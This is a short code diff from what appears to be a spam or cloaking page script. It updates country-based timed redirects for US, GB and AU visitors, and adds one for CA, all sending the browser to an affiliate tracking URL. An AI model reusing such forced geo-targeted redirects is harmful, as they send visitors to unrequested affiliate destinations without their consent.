@@ -9,19 +9,25 @@ country_code = country_code[0];
 
 if (country_code == "US"){
 
-setTimeout('window.location.href = "https://t.camsk5.com/133199/1713/9832?aff_sub5=SF_006OG000004lmDN"', xRedir);
+setTimeout('window.location.href = "https://t.camsk5.com/133199/223/0?aff_sub5=SF_006OG000004lmDN"', xRedir);
 
 }
 
 else if (country_code == "GB"){
 
-setTimeout('window.location.href = "https://t.camsk5.com/133199/1713/9832?aff_sub5=SF_006OG000004lmDN"', xRedir);
+setTimeout('window.location.href = "https://t.camsk5.com/133199/223/0?aff_sub5=SF_006OG000004lmDN"', xRedir);
 
 }
 
 else if (country_code == "AU"){
 
-setTimeout('window.location.href = "https://t.camsk5.com/133199/1713/9832?aff_sub5=SF_006OG000004lmDN"', xRedir);
+setTimeout('window.location.href = "https://t.camsk5.com/133199/223/0?aff_sub5=SF_006OG000004lmDN"', xRedir);
+
+}
+
+else if (country_code == "CA"){
+
+setTimeout('window.location.href = "https://t.camsk5.com/133199/223/0?aff_sub5=SF_006OG000004lmDN"', xRedir);
 
 }
 
